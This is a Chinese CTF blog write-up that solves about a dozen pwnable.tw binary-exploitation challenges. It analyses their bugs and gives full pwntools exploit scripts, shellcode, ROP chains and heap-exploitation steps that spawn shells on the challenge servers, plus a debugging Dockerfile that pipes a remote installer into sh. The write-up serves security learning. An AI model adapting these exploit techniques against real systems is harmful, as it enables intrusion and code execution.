# [PWNABLE.TW](https://pwnable.tw/challenge)

很早就有人和我推荐这个网站了，但是一直懒得写（

规则中有一句`Do not share entire solution code of high score challenges in public`。但是它没定义具体是多少分才能算“high score challenges”？我猜是400-500分的题。大可不必担心，我连150分的题能不能做出来都难说

## Start

竟然是32位程序，我都忘了该怎么做了（

checksec发现一个保护都没开，因此栈可执行。漏洞是栈溢出，返回entry打印栈上内容（0x08048087）的地方泄漏栈地址并跳转shellcode即可
```py
from pwn import *
p=remote("chall.pwnable.tw",10000)
p.sendafter("CTF:",b'a'*20+p32(0x08048087))
buf=u32(p.recv(4))+20
p.send(b'a'*20+p32(buf)+b"\x6A\x0B\x58\x53\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x31\xC9\x31\xD2\xCD\x80")
p.interactive()
```
shellcode内容如下：
```
push   0xb
pop    eax
push   ebx
push   0x68732f2f
push   0x6e69622f
mov    ebx,esp
xor ecx,ecx
xor edx,edx
int    0x80
```
(在 https://www.exploit-db.com/exploits/44321 抄的，需要自己补上清空ecx和edx的逻辑)

## orw

flag路径在规则里说过，直接pwntools秒了
```py
from pwn import *
p=remote("chall.pwnable.tw",10001)
p.sendlineafter(":",asm(shellcraft.open("/home/orw/flag")+shellcraft.read(3, 0x0804a060+300, 0x50)+shellcraft.write(1, 0x0804a060+300, 0x50)))
p.interactive()
```

## calc

止 步 于 此

最后还是没能靠自己发现漏洞的完全体，偷瞄了一眼 https://medium.com/@sagidana/calc-pwnable-tw-ef5450f40253 。没想到漏洞竟然是我第一眼看到的内容。然而我卡在了另一个更明显的溢出漏洞，完全忘记了这个我第一眼注意到的内容……

错误的漏洞如下（以下均为`parse_expr`里的内容）：

在switch-case处，`%`,`*`和`/`对应的case里有这么一段：
```c
          if ((history_symbols[last_symbol_idx] == '+') || (history_symbols[last_symbol_idx] == '-')
             ) {
            history_symbols[last_symbol_idx + 1] = *(char *)((int)expr + index);
            last_symbol_idx = last_symbol_idx + 1;
          }
```
搜索`last_symbol_idx`的引用会发现，这玩意的值只会增加，不会减少。而`history_symbols`距离栈顶只有`0x74`个字节。交替传入`+`号和`*`号即可溢出，比如`+1*1+1*1...`。但这个漏洞无法利用，原因：
- 题目有canary，这样的溢出必然会修改canary
- expr的内容在`get_expr`里有限制，写不了什么有用的东西

正确的漏洞如下：

注意开头有这么一段：
```c
    if (9 < (int)*(char *)((int)expr + index) - 0x30U) {
      __n = (int)expr + (index - (int)sub_expr);
      __s1 = (char *)malloc(__n + 1);
      memcpy(__s1,sub_expr,__n);
      __s1[__n] = '\0';
      operand = strcmp(__s1,"0");
      if (operand == 0) {
        puts("prevent division by zero");
        fflush((FILE *)stdout);
        uVar2 = 0;
        goto ret;
      }
      operand = atoi(__s1);
      //后面意识到这可能是作者的提示。前面已经检查了operand不能是0，这里却还在检查operand是否为0。那么可能存在一种情况，使operand不是0，但atoi的结果是0
      //当然有点马后炮了……
      if (0 < operand) {
                    /* 取出并更新当前栈上的索引: result_stack[0] */
        iVar1 = *result_stack;
        *result_stack = iVar1 + 1;
        result_stack[iVar1 + 1] = operand;
      }
```
如果用户输入的expr是`+1234`，这里`__s1`的内容就是`+`。这玩意atoi的结果是0，因此result_stack的索引不会更新。expr的末尾是null字符，那么null字符会进入这个if分支吗？答案是会。我光看ghidra的伪代码了，看到`(int)`就以为是有符号比较，那`0-0x30`是负数，自然就不会进入这个if分支。结果它的汇编其实是`cmp eax,9;jbe ...`。jbe用于无符号数比较，有符号的应该是jle。总之，1234会被转为数字，存入result_stack中

接下来会走到default case，执行eval里的这一段：
```c
  if (symbol == '+') {
    result_stack[*result_stack + -1] =
         result_stack[*result_stack + -1] + result_stack[*result_stack];
  }
```
此时`*result_stack`的值是1，那么这段就等于`result_stack[0] = result_stack[0] + result_stack[1]`。问题来了，`result_stack[0]`应该是栈的索引，现在却被用户修改了。回到calc，这一段代码就在引用索引：
```c
//ghidra的迷之定义
  int local_5a4;
  undefined4 auStack_5a0 [100];
//...
    iVar1 = parse_expr(expr,&local_5a4);
    if (iVar1 != 0) {
      printf("%d\n",auStack_5a0[local_5a4 + -1]);
      fflush((FILE *)stdout);
    }
```
于是我们有了个相对于`auStack_5a0`的任意地址读。任意地址写其实也有了。还是这一段：
```c
if (0 < operand) {
        iVar1 = *result_stack;
        *result_stack = iVar1 + 1;
        result_stack[iVar1 + 1] = operand;
      }
```
假如我们输入`+1234+5678`，在第二个`+`处会把栈索引修改为`1234`;处理5678时便会执行`result_stack[1234+1] = 5678`；紧接着eval里又会执行`result_stack[1234] = result_stack[1234] + result_stack[1235]`。至此一切就很明了了
```py
from pwn import *
exe=ELF('./calc')
p=remote("chall.pwnable.tw",10100)
p.recvline()
START_OFF=361
bss=0x80eb400
def read_offset(offset):
    p.sendline(f"+{START_OFF+offset}")
    return int(p.recvline(keepends=False))
def write_offset(offset,value):
    original=read_offset(offset)
    if value>original:
        p.sendline(f"+{START_OFF+offset}+{value-original}")
    else:
        p.sendline(f"+{START_OFF+offset}-{original-value}")
    p.recvline()
filename="/home/calc/flag"
write_offset(0,exe.sym['read'])
write_offset(1,exe.sym['calc'])
write_offset(2,0)
write_offset(3,bss)
write_offset(4,len(filename))
p.sendline()
p.send(filename)
write_offset(0,exe.sym['open'])
write_offset(1,exe.sym['calc'])
write_offset(2,bss)
write_offset(3,0)
p.sendline()
write_offset(0,exe.sym['read'])
write_offset(1,exe.sym['calc'])
write_offset(2,3)
write_offset(3,bss+0x100)
write_offset(4,0x50)
p.sendline()
write_offset(0,exe.sym['write'])
write_offset(1,exe.sym['calc'])
write_offset(2,1)
write_offset(3,bss+0x100)
write_offset(4,0x50)
p.sendline()
p.interactive()
```
不过我没想到怎么getshell（binary是静态链接，而且没找到system和execve等函数），于是用我的古法orw

悲伤的地方在于，我一直在测试`+x+x`类型的payload，但我的x太小了，导致我一直忽略了这块内容……就差一点我就能自己写出来了……下一次遇见奇怪的地方一定要测试透了再转到下一个内容啊……

## hacknote

这不比calc简单（

非常明显的uaf，但仍有几点需要注意：
- libc版本2.23，没有tcache；因此没法用万能的tcache poisoning（某种意义上旧版本我反而不会写了）
- 题目存在一个全局的计数变量，正常情况下只能malloc五个堆块（但好像没啥用，四次甚至就够用了）
- 注意题目设置的函数指针内部调用的是`puts(*(char **)(param_1 + 4))`

第三点卡了我好一会。`(***(code ***)(&notes + index * 4))(*(undefined4 *)(&notes + index * 4))`的调用方法等同于调用`func(func)`，但func无论如何不是有效的指令。后来意识到加个分号就好了：`;sh`，就算前面的函数指针不是有效的命令，后面这个是啊
```py
from pwn import *
libc = ELF("./libc_32.so.6")
r = remote("chall.pwnable.tw",10102)
def add(size,content):
    r.sendlineafter(":","1")
    r.sendlineafter(":",str(size))
    if len(content)==0:
        r.sendlineafter(":",content)
    else:
        r.sendafter(":",content)
def delete(idx):
    r.sendlineafter(":","2")
    r.sendlineafter(":",str(idx))
def show(idx):
    r.sendlineafter(":","3")
    r.sendlineafter(":",str(idx))
add(160,'a') #unsorted bin
add(24,'b') #防止后面free时上面这个chunk与top chunk合并。申请的大小只要不和note header的大小（8）一样就好
delete(0)
add(160,'')
show(2)
r.recv(4)
libc.address=u32(r.recv(4))-0x1b07b0
delete(1)
delete(2)
add(8,p32(libc.sym['system'])+b";sh\x00") #1号note的header
show(1)
r.interactive()
```

## dubblesort

那我问你，为什么不给我dockerfile？

存储name的变量事先没有清空，因此可以通过变量里遗留的内容泄漏libc地址

numbers的数量没有做限制，于是有一个很明显的溢出。关键点是输入`+`跳过canary，然后写调用system的rop链。我检查过了，libc里正好`/bin/sh`的地址大于system的地址，于是不用担心排序函数打乱rop链。唯一的问题是canary的值可能大于rop链的值。遇到这种情况只能重开

本地很快就通了，但是打远程时发现远程得到的地址和本地基本不一样。虽然主页有写用的是`Ubuntu 16.04/18.04`的docker image，但我实测发现地址的分布仍然不一样。假设需要泄漏的目标地址为x，无论是16.04还是18.04，x都在偏移24的地方；但远程偏移是28。而且这个地址的末尾是`\x00`，我一直拿`b'a'*(4*x-1)+b'\x0a'`去够地址，但想要泄漏这个地址必须不减那个1。又卡了我很久。唉下一次多注意吧
```py
from pwn import *
libc = ELF("./libc_32.so.6")
p=remote("chall.pwnable.tw",10101)
payload=b'a'*(4*7)
p.sendline(payload)
p.recvuntil(payload)
libc.address=u32(p.recv(4))-0x1b0000-0xa
p.sendlineafter(":",'35')
for i in range(24):
    p.sendlineafter(": ",'0')
p.sendlineafter(": ",'+')
for i in range(7):
    p.sendlineafter(": ",str(libc.sym['system']))
p.sendlineafter(": ",str(libc.sym['system']))
p.sendlineafter(": ",str(libc.sym['system']))
p.sendlineafter(": ",str(libc.search(b'/bin/sh').__next__()))
p.interactive()
```

## Silver Bullet

这类没有什么逆向成分的题做起来很舒服（再次点名calc）

漏洞在power_up函数中：
```c
read_input(local_38,0x30 - *(int *)(param_1 + 0x30));
strncat(param_1,local_38,0x30 - *(int *)(param_1 + 0x30));
```
有一个off by one，输入末尾的字符会溢出到`param_1 + 0x30`，覆盖长度属性。只要利用一次溢出将长度属性重置为1，后续`strncat`就会导致`param_1`溢出
```py
from pwn import *
exe = ELF("./silver_bullet_patched")
libc = ELF("./libc_32.so.6")
context.binary = exe
p=remote("chall.pwnable.tw", 10103)
def powerup(desc):
    p.sendlineafter(":",'2')
    p.sendlineafter(":",desc)
def create():
    p.sendlineafter(":",'1')
    p.sendlineafter(":",'a')
def beat():
    p.sendlineafter(":",'3')
def trigger(rop):
    create()
    powerup("zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz")
    powerup("z")
    powerup(rop)
    beat()
trigger(p32(0xffffffff)[:-1]+b'a'*4+p32(exe.plt['puts'])+p32(exe.sym['main'])+p32(exe.got['puts']))
p.recvuntil("!!\n")
libc.address=u32(p.recv(4))-0x5f140
assert libc.address&0xfff==0 #不知道为什么本地会频繁出现泄漏地址失败的情况，反而是远程比较稳定
trigger(p32(0xffffffff)[:-1]+b'a'*4+p32(libc.sym['system'])+p32(exe.sym['main'])+p32(libc.search(b'/bin/sh').__next__()))
p.interactive()
```
## 3x17

怎么150分的题普遍比200分的难？

main函数里给的一次任意地址写肯定不够，不过我之前见过fini_array技巧，可以获取无限调用（可惜不是所有题目都有fini_array）

一个很大的问题是，调用的地址需要是main函数的开头，保证rbp和rsp没问题；然而main函数中有计数变量`DAT_004b9330`，仅在该变量值为1时才能触发任意地址写。即使我们能够调用main函数无限次，也没法进入触发漏洞的分支……吗？

查看汇编，发现用的是`MOVZX EAX,byte ptr [DAT_004b9330]`。这意味着256次调用后计数变量将被重置。问题自然而然就解决了。接下来的问题是，该怎么拿RCE？考虑到程序内没有控制某个函数的参数这类现成的primitive，写rop链可能是个不错的选择。但我找不到怎么泄漏栈地址

事实证明我知识都学死了。瞄了一眼 https://github.com/AravGarg/pwnable.tw/tree/master/3X17 ，等一下你为什么用了leave？

用gdb在调用fini_array的地方（0x0402988）下个断点，会发现此处的rbp值等于fini_array……我完全没注意这点。这不是一个天然的栈迁移吗？后面就很简单了。不过静态链接的去符号binary导致我不确定里面有没有system函数，幸好绕个圈子用execve的syscall也不难
```py
from pwn import *
context.arch='amd64'
p=remote("chall.pwnable.tw",10105)
def arb_write(addr,value):
    p.sendlineafter("addr:",str(addr))
    if len(value)==0x18: #不加这个分支可能会导致远程没法正常getshell
        p.sendafter("data:",value)
    else:
        p.sendlineafter("data:",value)
fini_array=0x4b40f0
function_fini=0x402960
main=0x401b6d
rdi=0x401696
rdx_rsi=0x44a309
syscall=0x471db5
leave=0x401c4b
rax=0x41e4af
arb_write(fini_array,p64(function_fini)+p64(main))
arb_write(fini_array+0x10,p64(0)+p64(rdi)+p64(fini_array+0x58))
arb_write(fini_array+0x28,p64(rdx_rsi)+p64(0)+p64(0))
arb_write(fini_array+0x40,p64(rax)+p64(constants.SYS_execve)+p64(syscall))
arb_write(fini_array+0x58,b"/bin/sh\x00")
arb_write(fini_array,p64(leave)+p64(rdi))
p.interactive()
```

## applestore

添加的各个商品之间以双向链表的形式串联在一起。delete里有熟悉的unlink操作：
```c
    if (idx == item_number) {
                    /* 双向链表，next */
      item_number = local_38[2];
      prev = local_38[3];
      if (prev != 0) {
        *(int *)(prev + 8) = item_number;
      }
      if (item_number != 0) {
        *(int *)(item_number + 0xc) = prev;
      }
    }
```
但目前并没有触发的契机。checkout处倒是很可疑：
```c
  if (total_price == 0x1c06) {
    puts("*: iPhone 8 - $1");
    asprintf(&local_24,"%s","iPhone 8");
    local_20 = 1;
    insert(&local_24);
  }
```
如果当前添加的商品价格等于0x1c06，就会额外link进一个位于栈上的变量。绝对有猫腻，先用z3凑出0x1c06：
```py
from z3 import *
s=Solver()
x=Int('x')
y=Int('y')
z=Int('z')
m=Int('m')
s.add(x>=0)
s.add(y>=0)
s.add(z>=0)
s.add(m>=0)
s.add(x*199+y*299+z*499+m*399==0x1c06)
if s.check()==sat:
    print(s.model())
```
然后调试发现，local_24的地址在调用cart时的next字段正好指向handler里接收用户输入的buffer。借此可以泄漏libc地址

不知道怎么执行下一步了。unlink操作看起来可以将某个函数的got表写为system，但副作用是system周围也会被写入，而函数所在的内存肯定是不可写的，程序会炸掉。那往栈上考虑吧，去environ拿栈地址。结果我发现environ的栈地址与任何函数的栈帧的偏移都不是固定的……想了很久仍然不知道还有什么方法，放弃了

今天看 https://blog.srikavin.me/posts/pwnable-tw-applestore 时发现和我的思路差不多？为什么这里泄漏的environ和delete函数的ebp偏移固定？我把脚本拿下来打远程，成功了；但本地却无法成功，gdb调试发现偏移仍然是不固定的

所以一定要用docker啊！
```py
from pwn import *
exe_path = './applestore_patched'
exe=ELF(exe_path)
libc=ELF("./libc_32.so.6")
p=remote("chall.pwnable.tw",10104)
def select(value,option):
    if value=='':
        p.sendlineafter("> ",option)
    else:
        p.sendafter("> ",value)
def add(device):
    p.sendlineafter("> ",'2')
    p.sendlineafter("> ",str(device))
def checkout(value=''):
    select(value,'5')
    p.sendlineafter("> ",'y')
def cart(value='',prompt=''):
    select(value,'4')
    select(prompt,'y')
def delete(idx,value=''):
    select(value,'3')
    p.sendlineafter("Number> ",str(idx))
for i in range(10):
    add(1)
for i in range(2):
    add(3)
for i in range(14):
    add(2)
checkout()
cart(p32(0x804b034)+p32(0)*3) #atoi只要第一个字符是数字就好，后面的不是数字也不影响。0x804b034正好是一个以字符'4'结尾的got项
p.recvuntil("28: ")
libc.address=u32(p.recv(4))-0x18540
cart(prompt=b'yy'+p32(libc.sym['environ'])+p32(0)*2) #cart里还有一个提示用户输入的地方，这个地方的地址+2正好和上述的地址一样
#或者用覆盖next字段的方式泄漏也行，但这样泄漏的就不是environ的内容，而是environ指向的内容。不知道这样泄漏出来的地址在远程与ebp的偏移是否固定
p.recvuntil("27: ")
ebp=u32(p.recv(4))-260
delete(28,p32(0x804b033)+p32(0)+p32(ebp-0xc)+p32(exe.got['atoi']+0x22)) #触发unlink，让ebp为atoi的got表+0x22
'''
handler函数的输入变量位于ebp-0x22:
        08048c05 8d 45 de        LEA        EAX=>input_value,[EBP + -0x22]
        08048c08 89 04 24        MOV        dword ptr [ESP]=>local_3c,EAX
        08048c0b e8 89 fb        CALL       my_read
                 ff ff
'''
p.sendafter(b'>', p32(libc.symbols['system']) + b';/bin/sh;') #于是此处用system覆盖了atoi的got表，紧接着就调用atoi触发system
p.interactive()
```

## seethefile

libc 2.23 fsop。这个版本可以通过伪造vtable得到rce： https://ctf-wiki.org/pwn/linux/user-mode/io-file/fake-vtable-exploit 。比如fclose函数最终会调用`_IO_file_close`，把vtable覆盖成某块可控制的内存区域然后把`_IO_file_close`对应的偏移处改成system即可。但这题需要伪造整个文件结构，没法直接莽了（

可以通过`/proc/self/maps`得到libc的地址。不过由于上述fclose路径需要处理太多东西，建议按照这篇[wp](https://blog.srikavin.me/posts/pwnable-tw-seethefile)的方法走`_IO_FINISH`路径

## Death Note

很明显的负索引溢出，借show_note可以从got项中泄漏出libc地址。再借用整数溢出，可以实现任意地址读。想着这题的栈可执行，最终肯定要和栈扯上关系吧？于是顺便读了environ，得到栈地址

然后我不会了。这题没有办法写太多东西，只有“任意地址写不可控的堆地址”。我记不起来要做啥了（另外，后续看writeup区Lnevx的wp发现此处应该做[house of spirit](https://github.com/shellphish/how2heap/blob/master/glibc_2.23/house_of_spirit.c)，我之前学过的，忘了……不行我得做个备忘录，太多house技巧了，根本记不住）

结果我发现了 https://kazma.tw/2024/06/07/Pwnable-tw-Death-Note-Writeup 。不是哥们，你这个是什么奇怪的解法？我最开始就注意到可以覆盖got表，但堆不可执行啊？这不会炸掉吗？本地运行了这个exp，果然不行；但远程却可以。嗯？难道又是docker环境的锅？遂build了一个18.04的环境，堆仍然是不可执行的啊？我从未见过可执行的堆（至少在程序内没有任何设置的情况下），是怎么猜到远程的堆可执行的？

放个调试用的dockerfile：
```dockerfile
FROM ubuntu:18.04
ENV DEBIAN_FRONTEND=noninteractive
RUN apt-get update && \
    apt-get install -y \
        python3 python3-dev python3-pip \
        build-essential \
        gdb gdbserver \
        netcat \
        strace ltrace \
        git wget curl vim nano \
        libssl-dev libffi-dev \
        lib32z1 libc6-dbg lib32gcc1 lib32stdc++6 \
        tmux \
    && rm -rf /var/lib/apt/lists/*
RUN pip3 install --upgrade pip
RUN pip3 install pwntools==4.7.0 && \
    pip3 install pyelftools==0.27
RUN curl -qsL 'https://install.pwndbg.re' | sh -s -- -t pwndbg-gdb
WORKDIR /root/work
CMD ["/bin/bash"]
```
```sh
docker build -t pwn-env .
```
```sh
docker run -it --rm \
    --security-opt seccomp=unconfined \
    -v $(pwd):/root/work \
    pwn-env
```
## Tcache Tear

事实证明我根本就不知道怎么做fake chunk

libc 2.27，有double free。依稀记得某个版本前（后面发现是2.33前）double free的检查都较为宽松，试了一下发现果然如此。再加个tcache poisoning，很快就有了任意地址写

但是没有多少地址，菜单也没给leak选项。现在想想或许可以分配到stdout上用fsop泄漏？但当时我只想看看有什么办法能整出个unsorted bin里的chunk。就在这时我发现malloc_chunk里有个堆溢出，可以输入负数size，read时size会被转成无符号数。但是这题对堆块的操控有局限性，只能往最近分配到的chunk里写值；而且堆溢出到其他的chunk似乎没什么用？

name很可疑，为什么info函数会打印最开始输入的name？这时我就想，能不能free掉name，使其落入unsorted bin？于是开头输入name时我尝试伪造堆块结构`p64(0)+p64(0x521)`，然而free后仍然报错

我以为是我没有伪造出完整的fake chunk，在这卡了很久。后续看[wp](https://www.theflash2k.me/blog/writeups/pwnable.tw/tcache_tear)后发现是因为需要在fake chunk之后再放两个fake chunk。再参考 https://pwnable.tw/writeup/33/23230 会比较清晰：
```
chunk A B C（地址上的先后顺序）

当free A时，glibc检查B是否在用，因此会检查C的prev_inused位
如果B是空闲状态，glibc会unlink B，可能会触发consolidate将多个chunk合并（有时合并至top chunk）
如果B是占用状态，glibc会将其prev_inused位设为0，标记A此时是空闲的
```
另外，第一篇wp的图画错了。应该是：
```
| -- PREV_SIZE -- | --- SIZE ---- |
| ---- FD ----- | ----- BK ------ |
```
用户数据（DATA）和fd/bk字段是重合的。虽然脚本中flat的字段数量符合wp中画的图，但这是因为wp中有一个错误。攻击成功的原因根本不是里面说的“Unsorted Bin Attack”：“控制某个chunk的bk字段，进而通过将某个chunk free至unsorted bin来向bk-0x10处写入libc地址”。bk字段仅在空闲状态下的chunk有效，而这里伪造的是占用状态下的chunk，控制fd/bk字段根本就毫无意义。不过运行脚本会发现去掉那个地址的确不行，这是因为name和chunk是相邻的，脚本中布置bk字段的位置正好与chunk的地址重合。所谓的“设置bk”其实是在覆盖chunk的内容，从而将fake chunk free至unsorted bin

第二篇wp会更清楚一些